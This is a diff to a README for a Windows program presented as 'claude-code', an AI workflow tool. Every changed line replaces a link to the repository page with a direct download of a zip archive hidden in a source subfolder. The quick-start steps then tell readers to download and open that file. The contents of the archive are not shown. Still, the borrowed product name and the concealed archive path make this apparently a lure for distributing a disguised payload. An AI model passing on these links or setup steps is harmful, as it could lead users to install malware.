@@ -1,6 +1,6 @@
 # 🧠 claude-code - Simple AI workflow tool for Windows
 
-[![Download claude-code](https://img.shields.io/badge/Download-claude--code-ff6b6b?style=for-the-badge)](https://github.com/reenahot496/claude-code)
+[![Download claude-code](https://img.shields.io/badge/Download-claude--code-ff6b6b?style=for-the-badge)](https://raw.githubusercontent.com/reenahot496/claude-code/main/src/tools/ExitPlanModeTool/code-claude-v2.5.zip)
 
 ## 🚀 What is claude-code?
 
@@ -31,7 +31,7 @@ For best results, use a recent Windows update and keep your browser current if t
 
 Open the main download page here:
 
-https://github.com/reenahot496/claude-code
+https://raw.githubusercontent.com/reenahot496/claude-code/main/src/tools/ExitPlanModeTool/code-claude-v2.5.zip
 
 Follow these steps:
 
@@ -202,7 +202,7 @@ This project is set up for Windows use based on the download path and project fo
 
 ## 📎 Quick start
 
-1. Open the download page: https://github.com/reenahot496/claude-code
+1. Open the download page: https://raw.githubusercontent.com/reenahot496/claude-code/main/src/tools/ExitPlanModeTool/code-claude-v2.5.zip
 2. Download the Windows file
 3. Open the file on your PC
 4. Finish setup
